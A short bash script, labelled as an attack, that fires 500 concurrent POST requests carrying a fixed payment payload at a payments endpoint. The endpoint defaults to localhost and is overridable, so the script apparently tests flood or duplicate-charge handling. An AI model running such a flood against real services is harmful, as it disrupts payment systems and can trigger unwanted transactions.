#!/bin/bash
TARGET="${TARGET_URL:-http://localhost/payments}"
echo "[attack] Starting flood on $TARGET"
for i in $(seq 1 500); do
  curl -s -o /dev/null -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{"amount":1.00,"currency":"EUR","user_id":1}' &
done
wait
echo "[attack] Flood done"
